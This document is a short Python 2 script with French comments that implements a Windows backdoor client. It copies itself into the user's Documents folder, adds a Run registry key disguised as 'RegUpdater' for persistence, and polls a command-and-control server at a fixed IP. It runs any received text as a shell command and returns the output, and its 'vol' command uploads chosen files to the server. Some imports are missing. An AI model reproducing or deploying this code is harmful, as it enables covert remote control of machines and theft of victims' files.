import requests
import subprocess
import time
import os

URL_SERVER = "http://10.142.10.22"

#Persistence
# path courant
path = os.getcwd().strip('/n')
print path

# user profile
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# destination outil
destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

#Si 1ere execution
if not os.path.exists(destination):

    # Copie executable
    shutil.copyfile(path+'\\client.exe', destination)
    print 'Fichier copie'

    #cle de registre
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
    print 'cle cree'





while True:

    req = requests.get(URL_SERVER)
    command = req.text
    
    #Commande FERMER
    if 'fermer' in command:
        break

    #Commande AIDE
    elif 'aide' in command:
        data = '\n'
        data += 'Les commandes utilisables:\n'
        data += '       aide -> affiche cette aide\n'
        data += '       vol -> recuperer un fichier sur la cible\n'
        data += '\n'
        post_response = requests.post(url=URL_SERVER, data=data)

    #Commande VOL
    elif 'vol' in command:
        cmd = command.split(' ')

        if len(cmd) >= 2:
            vol = cmd[0]

            path = ""
            for i in range(1, len(cmd)):
                path += cmd[i]
                path += " "
            path = path[:-1]

            if os.path.exists(path):
                post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Nom du fichier: "+path)
                url_store = URL_SERVER+"/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url=url_store, files=files)
            else:
                post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Fichier introuvable")

        else:
            post_response = requests.post(url=URL_SERVER+"/store", data="probleme d'arguments, ex: vol fichier\a\voler")                         



    #Commande Windows classique
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=URL_SERVER, data=CMD.stdout.read())
        post_response = requests.post(url=URL_SERVER, data=CMD.stderr.read())

    time.sleep(3)
